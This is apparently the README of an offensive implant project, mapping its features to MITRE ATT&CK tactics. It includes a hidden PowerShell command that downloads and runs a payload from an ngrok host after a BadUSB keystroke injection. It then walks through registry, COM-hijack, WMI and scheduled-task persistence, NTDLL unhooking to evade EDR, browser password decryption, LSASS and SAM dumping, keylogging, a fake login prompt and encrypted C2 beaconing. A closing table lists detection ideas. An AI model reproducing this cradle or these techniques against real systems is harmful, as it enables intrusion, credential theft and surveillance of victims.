# 🎯 MITRE ATT&CK Mapping

This document maps the techniques implemented in this project to the MITRE ATT&CK framework.

## Overview

The project implements **25+ techniques** across **11 tactics** of the ATT&CK framework.

---

## Initial Access (TA0001)

### T1091 - Replication Through Removable Media

**Implementation:** Digispark BadUSB

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  BadUSB Attack Flow                                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1. Digispark ATtiny85 plugged in                                           │
│  2. Windows detects HID keyboard (no driver prompt)                         │
│  3. 3-second delay (Windows initialization)                                 │
│  4. Simulates keystrokes: Win+R → PowerShell command                        │
│  5. Downloads and executes implant from C2 server                           │
│                                                                              │
│  Detection: Monitor for rapid HID device connections + PowerShell execution │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Execution (TA0002)

### T1059.001 - Command and Scripting Interpreter: PowerShell

**Implementation:** Hidden PowerShell download cradle

```powershell
powershell -w hidden -c "iwr 'https://xxx.ngrok-free.dev/files/payload.exe' -o $env:TEMP\x.exe; saps $env:TEMP\x.exe"
```

**Evasion techniques:**
- `-w hidden` - No visible window
- Direct download to TEMP folder
- Immediate execution via `Start-Process`

### T1106 - Native API

**Implementation:** Direct Windows API calls

- `CreateProcess` for command execution
- `SetWindowsHookEx` for keylogging
- `MiniDumpWriteDump` for LSASS dumping
- BCrypt APIs for cryptography

---

## Persistence (TA0003)

### T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys

**Implementation:** Registry Run key persistence

```
Location: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Value: "WindowsSecurityService"
Data: "C:\Users\<user>\AppData\Local\Temp\svc.exe"
```

**Why HKCU?**
- No admin required
- Less monitored than HKLM
- User-specific (per-user infection)

### T1546.015 - Event Triggered Execution: COM Hijacking

**Implementation:** MMDeviceEnumerator hijacking

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  COM Hijacking - MMDeviceEnumerator                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Target CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}                       │
│                                                                              │
│  BEFORE (legitimate):                                                       │
│  HKLM\...\CLSID\{BCDE...}\InprocServer32 → mmdevapi.dll                    │
│                                                                              │
│  AFTER (hijacked):                                                          │
│  HKCU\...\CLSID\{BCDE...}\InprocServer32 → malicious.dll                   │
│                                                                              │
│  Windows search order: HKCU first → loads our DLL instead!                  │
│                                                                              │
│  Triggered by: Any app using audio (Chrome, Spotify, etc.)                  │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### T1053.005 - Scheduled Task/Job: Scheduled Task

**Implementation:** Task Scheduler persistence

```xml
Task Name: WindowsSecurityUpdate
Trigger: User logon
Action: Execute implant
Run Level: Highest available
Hidden: Yes
```

### T1546.003 - Event Triggered Execution: WMI Event Subscription

**Implementation:** WMI permanent event consumer

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  WMI Event Subscription                                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  __EventFilter: "WindowsUpdateFilter"                                       │
│    Query: SELECT * FROM __InstanceCreationEvent WITHIN 60                   │
│           WHERE TargetInstance ISA 'Win32_LogonSession'                     │
│                                                                              │
│  __EventConsumer: "WindowsUpdateConsumer"                                   │
│    CommandLineTemplate: C:\path\to\implant.exe                              │
│                                                                              │
│  __FilterToConsumerBinding: Links filter to consumer                        │
│                                                                              │
│  Trigger: Every user logon (checked every 60 seconds)                       │
│  Requires: Administrator privileges                                          │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Defense Evasion (TA0005)

### T1562.001 - Impair Defenses: Disable or Modify Tools

**Implementation:** NTDLL Unhooking

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  NTDLL Unhooking Technique                                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Problem: EDR hooks ntdll.dll functions to monitor API calls                │
│                                                                              │
│  Solution:                                                                  │
│  1. Read clean ntdll.dll from disk (C:\Windows\System32\ntdll.dll)         │
│  2. Map .text section into memory                                           │
│  3. Overwrite hooked ntdll.dll in process memory with clean copy           │
│  4. EDR hooks are removed → syscalls go directly to kernel                 │
│                                                                              │
│  Result: Security product monitoring is bypassed                            │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### T1027 - Obfuscated Files or Information

**Implementation:** Compile-time string encryption

- All sensitive strings encrypted at compile time
- Decrypted only at runtime when needed
- Prevents static analysis signature detection

### T1497.003 - Virtualization/Sandbox Evasion: Time Based Evasion

**Implementation:** Sleep obfuscation

- Before sleeping: Encrypt all code/data in memory
- During sleep: Memory contains only encrypted garbage
- On wake: Decrypt and continue execution
- Result: Memory scans during sleep find nothing suspicious

---

## Credential Access (TA0006)

### T1555.003 - Credentials from Password Stores: Credentials from Web Browsers

**Implementation:** Chromium password stealer

Supported browsers: Chrome, Edge, Brave, Opera, Opera GX

Process:
1. Read "Local State" file → extract encrypted master key
2. Decrypt master key using DPAPI (CryptUnprotectData)
3. Read "Login Data" SQLite database
4. Decrypt each password using AES-GCM with master key

### T1056.001 - Input Capture: Keylogging

**Implementation:** Low-level keyboard hook

```cpp
SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hModule, 0);
```

- Global keyboard hook
- Captures all keystrokes system-wide
- Logs to encrypted buffer
- Exfiltrates on `keylog_dump` command

### T1003.001 - OS Credential Dumping: LSASS Memory

**Implementation:** LSASS memory dump

Requirements: Administrator + SeDebugPrivilege

Process:
1. Enable SeDebugPrivilege
2. Find lsass.exe PID
3. OpenProcess with PROCESS_ALL_ACCESS
4. MiniDumpWriteDump to create memory dump
5. Exfiltrate dump for offline analysis with Mimikatz

### T1003.002 - OS Credential Dumping: SAM

**Implementation:** SAM database extraction via esentutl

- Extracts local account NTLM hashes
- Requires administrator privileges
- Offline cracking or Pass-the-Hash attacks

### T1056.002 - Input Capture: GUI Input Capture

**Implementation:** Fake login prompt

- Uses `CredUIPromptForWindowsCredentialsW`
- Native Windows appearance
- Pre-fills username for credibility
- Captures plaintext password

---

## Discovery (TA0007)

### T1082 - System Information Discovery

**Implementation:** Comprehensive system reconnaissance

| Command | Information Gathered |
|---------|---------------------|
| `sysinfo` | Complete system report |
| `osinfo` | OS version, build, architecture |
| `hwinfo` | CPU, RAM, disk information |
| `netinfo` | Network configuration |
| `userinfo` | User accounts, privileges |
| `software` | Installed applications |
| `services` | Running services |
| `security` | UAC, Firewall, Defender status |

### T1057 - Process Discovery

**Implementation:** Process enumeration

- Lists all running processes
- `psfind` searches by name
- `detect_av` identifies security software

---

## Collection (TA0009)

### T1113 - Screen Capture

**Implementation:** GDI+ screenshot

- Captures full desktop
- Encodes as JPEG
- Base64 for transmission

---

## Command and Control (TA0011)

### T1573.001 - Encrypted Channel: Symmetric Cryptography

**Implementation:** AES-256-CBC

- Key: Derived from ECDH shared secret via SHA-256
- IV: Random 16 bytes per message
- Padding: PKCS7
- Format: Base64(IV || Ciphertext)

### T1071.001 - Application Layer Protocol: Web Protocols

**Implementation:** HTTPS beaconing

- HTTPS over port 443 (blends with normal traffic)
- Ngrok tunnel for infrastructure hiding
- JSON payload format
- User-Agent rotation

---

## Detection Opportunities

| Technique | Detection Method |
|-----------|------------------|
| Registry Run Keys | Monitor `HKCU\...\Run` modifications |
| COM Hijacking | Track CLSID registrations in HKCU |
| NTDLL Unhooking | Memory integrity monitoring |
| LSASS Dump | Protected process monitoring |
| Keylogging | Detect `SetWindowsHookEx` calls |
| Beaconing | Network traffic pattern analysis |

---

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
